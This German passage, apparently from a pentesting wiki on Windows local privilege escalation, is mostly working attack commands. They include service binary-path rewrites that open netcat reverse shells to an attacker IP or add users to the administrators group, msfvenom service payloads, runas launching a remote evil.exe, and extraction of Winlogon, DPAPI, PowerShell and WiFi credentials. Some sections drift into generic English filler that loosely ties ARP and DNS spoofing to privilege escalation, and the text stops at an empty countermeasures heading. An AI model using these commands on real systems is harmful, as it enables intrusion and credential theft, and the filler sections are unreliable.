Bitte beachten Sie, dass dieser Befehl nur unter Windows 10 und Windows Server 2019 oder neueren Versionen verfügbar ist.
```bash
powershell -command "Get-Clipboard"
```
## Laufende Prozesse

### Datei- und Ordnerberechtigungen

Zunächst einmal sollten Sie die Prozesse auflisten und **überprüfen, ob sich Passwörter in der Befehlszeile des Prozesses befinden**.\
Überprüfen Sie, ob Sie **eine ausführbare Datei überschreiben können, die gerade ausgeführt wird**, oder ob Sie Schreibberechtigungen für den Ordner der ausführbaren Datei haben, um mögliche [**DLL-Hijacking-Angriffe**](dll-hijacking.md) auszunutzen:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Immer nach möglichen [**Electron/CEF/Chromium-Debuggern** suchen, die ausgeführt werden. Du könntest sie missbrauchen, um Privilegien zu eskalieren](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Überprüfen der Berechtigungen der Prozess-Binärdateien**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Überprüfen der Berechtigungen der Ordner der Prozess-Binärdateien (DLL-Hijacking)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory-Passwort-Mining

Sie können einen Speicherabbild eines laufenden Prozesses mithilfe von **procdump** von Sysinternals erstellen. Dienste wie FTP haben die **Anmeldeinformationen im Klartext im Speicher**, versuchen Sie den Speicher abzubilden und die Anmeldeinformationen zu lesen.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Unsichere GUI-Anwendungen

**Anwendungen, die als SYSTEM ausgeführt werden, können einem Benutzer ermöglichen, eine CMD zu starten oder Verzeichnisse zu durchsuchen.**

Beispiel: "Windows-Hilfe und Support" (Windows + F1), Suche nach "Eingabeaufforderung", klicken Sie auf "Klicken Sie hier, um die Eingabeaufforderung zu öffnen"

## Dienste

Erhalten Sie eine Liste der Dienste:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Berechtigungen

Sie können **sc** verwenden, um Informationen über einen Dienst abzurufen.
```bash
sc qc <service_name>
```
Es wird empfohlen, die Binärdatei **accesschk** von _Sysinternals_ zu verwenden, um das erforderliche Berechtigungsniveau für jeden Dienst zu überprüfen.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Es wird empfohlen zu überprüfen, ob "Authentifizierte Benutzer" einen Dienst ändern können:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Hier können Sie accesschk.exe für XP herunterladen](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Dienst aktivieren

Wenn Sie diesen Fehler haben (zum Beispiel mit SSDPSRV):

_Systemfehler 1058 ist aufgetreten._\
_Der Dienst kann nicht gestartet werden, entweder weil er deaktiviert ist oder weil ihm keine aktivierten Geräte zugeordnet sind._

Sie können ihn aktivieren, indem Sie Folgendes verwenden:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Beachten Sie, dass der Dienst upnphost von SSDPSRV abhängig ist, um zu funktionieren (für XP SP1)**

**Eine weitere Lösung** für dieses Problem besteht darin, Folgendes auszuführen:
```
sc.exe config usosvc start= auto
```
### **Ändern des Dienst-Binärpfads**

In dem Szenario, in dem die Gruppe "Authentifizierte Benutzer" über **SERVICE_ALL_ACCESS** auf einen Dienst zugreifen kann, ist es möglich, den ausführbaren Binärpfad des Dienstes zu ändern. Um den Befehl **sc** zu ändern und auszuführen:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Dienst neu starten

Um einen Dienst unter Windows neu zu starten, können Sie den folgenden Befehl verwenden:

```plaintext
net stop <Dienstname>
net start <Dienstname>
```

Ersetzen Sie `<Dienstname>` durch den Namen des Dienstes, den Sie neu starten möchten.
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Berechtigungen können durch verschiedene Berechtigungen eskaliert werden:
- **SERVICE_CHANGE_CONFIG**: Ermöglicht die Neukonfiguration der Dienstdatei.
- **WRITE_DAC**: Ermöglicht die Neukonfiguration von Berechtigungen, was zur Möglichkeit führt, Dienstkonfigurationen zu ändern.
- **WRITE_OWNER**: Ermöglicht den Erwerb von Eigentum und die Neukonfiguration von Berechtigungen.
- **GENERIC_WRITE**: Erbt die Fähigkeit, Dienstkonfigurationen zu ändern.
- **GENERIC_ALL**: Erbt ebenfalls die Fähigkeit, Dienstkonfigurationen zu ändern.

Zur Erkennung und Ausnutzung dieser Schwachstelle kann das _exploit/windows/local/service_permissions_ verwendet werden.

### Schwache Berechtigungen für Dienstdateien

**Überprüfen Sie, ob Sie die ausführbare Datei ändern können, die von einem Dienst ausgeführt wird**, oder ob Sie **Schreibberechtigungen für den Ordner** haben, in dem sich die ausführbare Datei befindet ([**DLL-Hijacking**](dll-hijacking.md))**.**\
Sie können jede ausführbare Datei, die von einem Dienst ausgeführt wird, mit **wmic** (nicht in system32) erhalten und Ihre Berechtigungen mit **icacls** überprüfen:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Sie können auch **sc** und **icacls** verwenden:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Berechtigungen zum Ändern des Dienstregistrierungsschlüssels

Sie sollten überprüfen, ob Sie den Dienstregistrierungsschlüssel ändern können.\
Sie können Ihre Berechtigungen für einen Dienstregistrierungsschlüssel überprüfen, indem Sie Folgendes tun:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Es sollte überprüft werden, ob **Authentifizierte Benutzer** oder **NT AUTHORITY\INTERACTIVE** über `FullControl`-Berechtigungen verfügen. Wenn dies der Fall ist, kann die vom Dienst ausgeführte Binärdatei geändert werden.

Um den Pfad der ausgeführten Binärdatei zu ändern:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Berechtigungen zum Hinzufügen von Daten/Unterverzeichnissen im Dienstregistrierung

Wenn Sie diese Berechtigung für eine Registrierung haben, bedeutet dies, dass **Sie Unterverzeichnisse erstellen können**. Im Falle von Windows-Diensten reicht dies aus, um beliebigen Code auszuführen:

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Nicht in Anführungszeichen stehende Dienstpfade

Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, versucht Windows, jeden Teil vor einem Leerzeichen auszuführen.

Zum Beispiel für den Pfad _C:\Program Files\Some Folder\Service.exe_ versucht Windows, Folgendes auszuführen:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Liste alle nicht in Anführungszeichen gesetzten Dienstpfade auf, die nicht zu den integrierten Windows-Diensten gehören:
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Sie können diese Schwachstelle mit Metasploit erkennen und ausnutzen**: `exploit/windows/local/trusted\_service\_path`
Sie können manuell eine Service-Binärdatei mit Metasploit erstellen:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Wiederherstellungsaktionen

Windows ermöglicht es Benutzern, Aktionen festzulegen, die im Falle eines Dienstausfalls durchgeführt werden sollen. Diese Funktion kann so konfiguriert werden, dass sie auf eine ausführbare Datei verweist. Wenn diese ausführbare Datei austauschbar ist, könnte eine Privileg-Eskalation möglich sein. Weitere Details finden Sie in der [offiziellen Dokumentation](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN).

## Anwendungen

### Installierte Anwendungen

Überprüfen Sie die **Berechtigungen der ausführbaren Dateien** (vielleicht können Sie eine überschreiben und Privilegien eskalieren) und der **Ordner** ([DLL-Hijacking](dll-hijacking.md)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Schreibberechtigungen

Überprüfen Sie, ob Sie eine Konfigurationsdatei ändern können, um eine spezielle Datei zu lesen, oder ob Sie eine ausführbare Datei ändern können, die von einem Administrator-Konto ausgeführt wird (schedtasks).

Eine Möglichkeit, schwache Ordner-/Dateiberechtigungen im System zu finden, besteht darin:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Beim Start ausführen

**Überprüfen Sie, ob Sie einige Registrierungseinträge oder Binärdateien überschreiben können, die von einem anderen Benutzer ausgeführt werden.**\
**Lesen** Sie die **folgende Seite**, um mehr über interessante **Autorun-Standorte zur Eskalation von Privilegien** zu erfahren:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### Treiber

Suchen Sie nach möglichen **Drittanbieter-Weird/Vulnerable**-Treibern
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL Hijacking

Wenn Sie **Schreibberechtigungen in einem Ordner haben, der sich im PATH befindet**, könnten Sie in der Lage sein, eine von einem Prozess geladene DLL zu hijacken und **Privilegien zu eskalieren**.

Überprüfen Sie die Berechtigungen aller Ordner im PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Für weitere Informationen darüber, wie man diese Überprüfung missbrauchen kann, siehe [writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md).

## Netzwerk

### Freigaben
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### Hosts-Datei

Überprüfen Sie, ob andere bekannte Computer in der Hosts-Datei fest codiert sind.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netzwerkschnittstellen & DNS

In this section, we will explore techniques related to network interfaces and DNS that can be used for local privilege escalation on Windows systems.

#### Network Interfaces

Network interfaces play a crucial role in communication between a computer and the network. By manipulating network interfaces, an attacker can gain elevated privileges on a Windows system.

##### ARP Spoofing

ARP spoofing is a technique where an attacker sends fake Address Resolution Protocol (ARP) messages to a local network. By doing so, the attacker can associate their own MAC address with the IP address of another network device, such as the default gateway. This allows the attacker to intercept network traffic and potentially gain unauthorized access to sensitive information.

##### DHCP Spoofing

DHCP spoofing involves impersonating a legitimate Dynamic Host Configuration Protocol (DHCP) server on a local network. By doing so, an attacker can assign malicious IP addresses to network devices, redirecting their traffic to the attacker's machine. This can be used to intercept network traffic and launch further attacks.

##### DNS Spoofing

DNS spoofing is a technique where an attacker manipulates the Domain Name System (DNS) to redirect network traffic to a malicious server. By spoofing DNS responses, an attacker can redirect users to fake websites or intercept their network traffic. This can be used to steal sensitive information or launch other attacks.

#### DNS Cache Poisoning

DNS cache poisoning is a technique where an attacker injects malicious DNS records into a DNS resolver's cache. By doing so, the attacker can redirect users to malicious websites or intercept their network traffic. This can be used to launch phishing attacks or steal sensitive information.

#### Conclusion

Understanding network interfaces and DNS is essential for identifying and exploiting vulnerabilities that can lead to local privilege escalation on Windows systems. By leveraging these techniques, an attacker can gain elevated privileges and potentially compromise the security of a target system.
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Offene Ports

Überprüfen Sie von außen auf **eingeschränkte Dienste**
```bash
netstat -ano #Opened ports?
```
### Routing-Tabelle

Die Routing-Tabelle ist eine wichtige Komponente in einem Netzwerk, die verwendet wird, um den Weg festzulegen, den Datenpakete nehmen, um von einem Netzwerk zum anderen zu gelangen. Sie enthält Informationen über die verschiedenen Netzwerke und die entsprechenden Gateways, über die die Datenpakete weitergeleitet werden sollen.

Die Routing-Tabelle besteht aus einer Liste von Einträgen, die als Routen bezeichnet werden. Jeder Eintrag enthält Informationen wie die Zielnetzwerkadresse, die Subnetzmaske und das Gateway, über das die Datenpakete weitergeleitet werden sollen.

Wenn ein Datenpaket das Netzwerk verlässt, überprüft das Betriebssystem die Routing-Tabelle, um den besten Weg zum Zielnetzwerk zu finden. Es vergleicht die Zieladresse des Datenpakets mit den Einträgen in der Routing-Tabelle und wählt den Eintrag aus, der am besten passt. Das Gateway in diesem Eintrag wird dann verwendet, um das Datenpaket an das nächste Netzwerk weiterzuleiten.

Die Routing-Tabelle kann auf einem Windows-System mit dem Befehl `route print` angezeigt werden. Dieser Befehl zeigt alle Einträge in der Routing-Tabelle an, einschließlich der Zieladresse, der Subnetzmaske, des Gateways und der Schnittstelle.

Eine Routing-Tabelle kann auch von Angreifern ausgenutzt werden, um ihre Position im Netzwerk zu verbessern. Durch das Ändern der Einträge in der Routing-Tabelle können Angreifer den Datenverkehr umleiten und sensible Informationen abfangen oder manipulieren.

Es ist wichtig, die Routing-Tabelle regelmäßig zu überprüfen und sicherzustellen, dass nur autorisierte Einträge vorhanden sind. Verdächtige oder unbekannte Einträge sollten entfernt werden, um potenzielle Sicherheitslücken zu schließen.
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP-Tabelle

Die ARP-Tabelle (Address Resolution Protocol) ist eine Tabelle, die in einem Betriebssystem oder Netzwerkgerät gespeichert ist und die Zuordnung von IP-Adressen zu physischen MAC-Adressen enthält. Das ARP-Protokoll wird verwendet, um die MAC-Adresse eines Geräts zu ermitteln, wenn nur die IP-Adresse bekannt ist.

Die ARP-Tabelle wird verwendet, um den Netzwerkverkehr effizienter zu gestalten, indem sie die Notwendigkeit reduziert, ständig ARP-Anfragen zu senden. Wenn ein Gerät versucht, mit einem anderen Gerät im Netzwerk zu kommunizieren, überprüft es zuerst seine ARP-Tabelle, um festzustellen, ob die MAC-Adresse des Zielgeräts bereits bekannt ist. Wenn die MAC-Adresse vorhanden ist, kann der Netzwerkverkehr direkt an das Zielgerät gesendet werden, ohne eine ARP-Anfrage zu senden. Wenn die MAC-Adresse nicht in der ARP-Tabelle vorhanden ist, sendet das Gerät eine ARP-Anfrage, um die MAC-Adresse des Zielgeräts zu ermitteln und diese dann in der ARP-Tabelle zu speichern.

Die ARP-Tabelle kann auch von Angreifern ausgenutzt werden, um Angriffe wie ARP-Spoofing oder ARP-Cache-Poisoning durchzuführen. Bei diesen Angriffen wird die ARP-Tabelle manipuliert, um den Netzwerkverkehr umzuleiten oder abzufangen. Es ist wichtig, die Sicherheit der ARP-Tabelle zu gewährleisten, um solche Angriffe zu verhindern.
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall-Regeln

[**Überprüfen Sie diese Seite für Firewall-bezogene Befehle**](../basic-cmd-for-pentesters.md#firewall) **(Auflisten von Regeln, Erstellen von Regeln, Deaktivieren, Aktivieren...)**

Weitere [Befehle zur Netzwerk-Enumeration hier](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem für Linux (WSL)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Die ausführbare Datei `bash.exe` kann auch unter `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` gefunden werden.

Wenn Sie Root-Zugriff haben, können Sie auf jedem Port lauschen (beim ersten Mal, wenn Sie `nc.exe` verwenden, um auf einem Port zu lauschen, wird über die GUI gefragt, ob `nc` durch die Firewall zugelassen werden soll).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Um Bash problemlos als Root zu starten, können Sie `--default-user root` ausprobieren.

Sie können das Dateisystem von `WSL` im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` erkunden.

## Windows-Anmeldeinformationen

### Winlogon-Anmeldeinformationen
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials-Manager / Windows-Tresor

Von [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Der Windows-Tresor speichert Benutzeranmeldeinformationen für Server, Websites und andere Programme, mit denen **Windows** die Benutzer automatisch anmelden kann. Auf den ersten Blick mag es so aussehen, als könnten Benutzer ihre Facebook-Anmeldeinformationen, Twitter-Anmeldeinformationen, Gmail-Anmeldeinformationen usw. speichern, um sich automatisch über Browser anzumelden. Aber das ist nicht der Fall.

Der Windows-Tresor speichert Anmeldeinformationen, mit denen Windows die Benutzer automatisch anmelden kann. Das bedeutet, dass jede **Windows-Anwendung, die Anmeldeinformationen benötigt, um auf eine Ressource** (Server oder Website) **zuzugreifen, den Credential Manager** und den Windows-Tresor nutzen kann und die bereitgestellten Anmeldeinformationen anstelle der Benutzername und Passwort jedes Mal eingeben zu müssen.

Es ist meiner Meinung nach nicht möglich, dass Anwendungen die Anmeldeinformationen für eine bestimmte Ressource verwenden, es sei denn, sie interagieren mit dem Credential Manager. Wenn Ihre Anwendung also den Tresor nutzen möchte, muss sie auf irgendeine Weise **mit dem Credential Manager kommunizieren und die Anmeldeinformationen für diese Ressource** aus dem Standardspeichertresor anfordern.

Verwenden Sie `cmdkey`, um die gespeicherten Anmeldeinformationen auf dem Computer aufzulisten.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dann können Sie `runas` mit den Optionen `/savecred` verwenden, um die gespeicherten Anmeldeinformationen zu verwenden. Das folgende Beispiel ruft eine entfernte Binärdatei über einen SMB-Freigabe auf.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Verwendung von `runas` mit einem bereitgestellten Satz von Anmeldeinformationen.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Beachten Sie, dass mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html) oder das [Empire Powershells Modul](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1) verwendet werden können.

### DPAPI

Die **Data Protection API (DPAPI)** bietet eine Methode zur symmetrischen Verschlüsselung von Daten und wird hauptsächlich im Windows-Betriebssystem zur symmetrischen Verschlüsselung asymmetrischer privater Schlüssel verwendet. Diese Verschlüsselung nutzt ein Benutzer- oder Systemgeheimnis, um zur Entropie beizutragen.

**DPAPI ermöglicht die Verschlüsselung von Schlüsseln durch einen symmetrischen Schlüssel, der aus den Anmeldegeheimnissen des Benutzers abgeleitet wird**. Bei Szenarien mit Systemverschlüsselung werden die Authentifizierungsgeheimnisse der Domäne des Systems verwendet.

Verschlüsselte Benutzer-RSA-Schlüssel werden mithilfe von DPAPI im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` die [Sicherheitskennung](https://en.wikipedia.org/wiki/Security\_Identifier) des Benutzers darstellt. **Der DPAPI-Schlüssel, der zusammen mit dem Hauptschlüssel, der die privaten Schlüssel des Benutzers schützt, in derselben Datei gespeichert ist**, besteht in der Regel aus 64 Bytes zufälliger Daten. (Es ist wichtig zu beachten, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist und das Auflisten des Inhalts über den `dir`-Befehl in CMD verhindert wird, obwohl es über PowerShell aufgelistet werden kann).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Sie können das **mimikatz-Modul** `dpapi::masterkey` mit den entsprechenden Argumenten (`/pvk` oder `/rpc`) verwenden, um es zu entschlüsseln.

Die **durch das Masterpasswort geschützten Anmeldedaten-Dateien** befinden sich normalerweise in:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Du kannst das **mimikatz-Modul** `dpapi::cred` mit dem entsprechenden `/masterkey` verwenden, um zu entschlüsseln.\
Du kannst **viele DPAPI-Masterkeys** aus dem **Speicher** extrahieren mit dem Modul `sekurlsa::dpapi` (wenn du root bist).

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShell-Anmeldeinformationen

**PowerShell-Anmeldeinformationen** werden häufig für **Skripting** und Automatisierungsaufgaben verwendet, um verschlüsselte Anmeldeinformationen bequem zu speichern. Die Anmeldeinformationen werden mit **DPAPI** geschützt, was normalerweise bedeutet, dass sie nur vom selben Benutzer auf demselben Computer entschlüsselt werden können, auf dem sie erstellt wurden.

Um PS-Anmeldeinformationen aus der Datei, die sie enthält, zu **entschlüsseln**, kannst du Folgendes tun:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi

Wi-Fi ist eine drahtlose Netzwerkverbindungstechnologie, die es Geräten ermöglicht, über Funkwellen miteinander zu kommunizieren. Es ist eine weit verbreitete Methode, um eine Internetverbindung herzustellen und ermöglicht es Benutzern, drahtlos auf das Netzwerk zuzugreifen.

Wi-Fi-Netzwerke sind in der Regel durch ein Passwort geschützt, um unbefugten Zugriff zu verhindern. Es gibt jedoch verschiedene Methoden, um Wi-Fi-Passwörter zu knacken und Zugriff auf ein gesichertes Netzwerk zu erhalten.

Einige gängige Methoden zum Knacken von Wi-Fi-Passwörtern sind:

- Brute-Force-Angriffe: Bei dieser Methode werden alle möglichen Kombinationen von Zeichen ausprobiert, um das Passwort zu erraten. Dies kann jedoch viel Zeit in Anspruch nehmen, insbesondere wenn das Passwort lang und komplex ist.

- Wörterbuchangriffe: Bei dieser Methode werden vordefinierte Wörterbuchdateien verwendet, um das Passwort zu erraten. Diese Methode ist schneller als Brute-Force, da sie eine Liste häufig verwendeter Passwörter verwendet.

- WPS-Schwachstellen: Wi-Fi Protected Setup (WPS) ist eine Funktion, die die Einrichtung von Wi-Fi-Netzwerken vereinfachen soll. Es gibt jedoch bekannte Schwachstellen in der WPS-Implementierung, die es Angreifern ermöglichen, das Passwort zu erraten.

Es ist wichtig zu beachten, dass das Knacken von Wi-Fi-Passwörtern illegal ist, es sei denn, Sie haben die ausdrückliche Erlaubnis des Netzwerkinhabers. Es ist wichtig, die Privatsphäre und Sicherheit anderer zu respektieren und Wi-Fi-Netzwerke nur auf legale Weise zu nutzen.
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gespeicherte RDP-Verbindungen

Sie können sie unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\` finden\
und unter `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Kürzlich ausgeführte Befehle
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop-Anmeldeinformationsverwaltung**

---

#### Beschreibung

Die Remote Desktop-Anmeldeinformationsverwaltung ist ein Dienst auf Windows-Systemen, der Anmeldeinformationen für Remote-Desktop-Verbindungen speichert. Diese Anmeldeinformationen können von Angreifern ausgenutzt werden, um eine lokale Privileg Eskalation zu erreichen.

#### Angriffsszenario

1. Identifizieren Sie den Dienst "Remote Desktop-Anmeldeinformationsverwaltung" auf dem Zielrechner.
2. Überprüfen Sie, ob der Dienst mit privilegierten Berechtigungen ausgeführt wird.
3. Extrahieren Sie die gespeicherten Anmeldeinformationen aus dem Credential Manager.
4. Überprüfen Sie, ob die extrahierten Anmeldeinformationen für andere Dienste oder Konten verwendet werden können.
5. Nutzen Sie die extrahierten Anmeldeinformationen, um eine lokale Privileg Eskalation durchzuführen.

#### Gegenmaßnahmen

